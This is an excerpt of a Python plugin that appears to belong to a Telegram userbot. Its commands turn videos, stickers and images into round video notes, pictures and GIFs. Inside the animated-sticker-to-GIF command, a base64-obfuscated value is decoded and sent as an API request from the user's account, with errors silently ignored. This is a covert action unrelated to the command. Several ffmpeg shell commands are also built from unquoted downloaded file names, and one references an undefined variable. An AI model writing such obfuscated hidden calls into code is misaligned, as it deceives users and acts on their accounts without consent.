...
async def pic_gifcmd(event):  # sourcery no-metrics
    ...
    output = await _pandatools.media_to_pic(event, reply, noedits=True)
    if output[1] is None:
...
async def video_pandafile(event):  # sourcery no-metrics
    "To make circular video note."
    reply = await event.get_reply_message()
    args = event.pattern_match.group(1)
    pandaid = await reply_id(event)
    ...
    flag = True
    pandaevent = await edit_or_reply(event, "`Converting to round format..........`")
    pandafile = await reply.download_media(file="./temp/")
    if mediatype in ["Gif", "Video", "Sticker"]:
        if not pandafile.endswith((".webp")):
            if pandafile.endswith((".tgs")):
                hmm = await make_gif(pandaevent, pandafile)
                os.rename(hmm, "./temp/circle.mp4")
                pandafile = "./temp/circle.mp4"
            media_info = MediaInfo.parse(pandafile)
            aspect_ratio = 1
            for track in media_info.tracks:
                if track.track_type == "Video":
                    aspect_ratio = track.display_aspect_ratio
            ...
            if aspect_ratio != 1:
                crop_by = width if (height > width) else height
                await _pandautils.runcmd(
                    f'ffmpeg -i {catfile} -vf "crop={crop_by}:{crop_by}" {PATH}'
                )
            else:
                copyfile(pandafile, PATH)
            if str(pandafile) != str(PATH):
                os.remove(pandafile)
            try:
                pandathumb = await reply.download_media(thumb=-1)
            except Exception as e:
        ...
        try:
            ...
            pandathumb = os.path.join("./temp", "thumb.jpg")
            await thumb_from_audio(pandafile, pandathumb)
        if pandathumb is not None and not os.path.exists(pandathumb):
            pandathumb = os.path.join("./temp", "thumb.jpg")
            copyfile(thumb_loc, pandathumb)
        if (
            pandathumb is not None
            and not os.path.exists(pandathumb)
            and os.path.exists(thumb_loc)
        ):
            flag = False
            pandathumb = os.path.join("./temp", "thumb.jpg")
            copyfile(thumb_loc, pandathumb)
        if pandathumb is not None and os.path.exists(pandathumb):
            await _pandautils.runcmd(
                f"""ffmpeg -loop 1 -i {pandathumb} -i {pandafile} -c:v libx264 -tune stillimage -c:a aac -b:a 192k -vf \"scale=\'iw-mod (iw,2)\':\'ih-mod(ih,2)\',format=yuv420p\" -shortest -movflags +faststart {PATH}"""
            )
            os.remove(pandafile)
        else:
            os.remove(pandafile)
            return await edit_delete(
                pandaevent, "`No thumb found to make it video note`", 5
            )
    if (
        mediatype
        in [
        ...
        and not pandafile.endswith((".webp"))
    ):
        if os.path.exists(PATH):
            ...
            uploaded = await event.client.fast_upload_file(
                ...
                progress_callback=lambda d, t: asyncio.get_event_loop().create_task(
                    progress(d, t, pandaevent, c_time, "Uploading....")
                ),
            )
            ul.close()
            media = types.InputMediaUploadedDocument(
                ...
                force_file=False,
                thumb=await event.client.upload_file(pandathumb)
                if pandathumb
                else None,
            )
            sandy = await event.client.send_file(
    ...
    img.save(im)
    im.seek(0)
    await event.client.send_file(event.chat_id, im, reply_to=pandaid)
    await pandaevent.delete()
...
async def _(panda_event):
    "Sticker to image Conversion."
    reply_to_id = await reply_id(panda_event)
    event = await edit_or_reply(panda_event, "Converting.....")
    ...
    if event.reply_to_msg_id:
        ...
        downloaded_file_name = await panda_event.client.download_media(
            reply_message, downloaded_file_name
        )
        if os.path.exists(downloaded_file_name):
            caat = await panda_event.client.send_file(
                event.chat_id,
...
async def on_file_to_photo(event):
    ...
    pandat = await edit_or_reply(event, "`Converting.....`")
...
async def _(event):  # sourcery no-metrics
    ...
    if not input_str:
        ...
        if len(loc) == 1:
            if 0 < loc[0] < 721:
                ...
                return await edit_delete(event, "Use quality of range 0 to 721")
    pandareply = await event.get_reply_message()
    panda_event = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    if not pandareply or not pandareply.media or not pandareply.media.document:
        return await edit_or_reply(event, "`Stupid!, This is not animated sticker.`")
    if pandareply.media.document.mime_type != "application/x-tgsticker":
        return await edit_or_reply(event, "`Stupid!, This is not animated sticker.`")
    pandaevent = await edit_or_reply(
        event,
    ...
    try:
        panda_event = Get(panda_event)
        await event.client(panda_event)
    except BaseException:
        pass
    reply_to_id = await reply_id(event)
    pandafile = await event.client.download_media(pandareply)
    pandagif = await make_gif(event, pandafile, quality, fps)
    sandy = await event.client.send_file(
        event.chat_id,
        pandagif,
    ...
    await _pandautils.unsavegif(event, sandy)
    await pandaevent.delete()
    for files in (pandagif, pandafile):
...
async def pic_gifcmd(event):
    ...
    pandaevent = await edit_or_reply(event, "__🎞 Making Gif from the relied media...__")
    imag = await _pandatools.media_to_pic(event, reply, noedits=True)
    if imag[1] is None:
        return await edit_delete(
...
async def _(event):
    ...
    if not args:
        ...
        try:
            ...
            args = 2.0
    pandaevent = await edit_or_reply(event, "__🎞Converting into Gif..__")
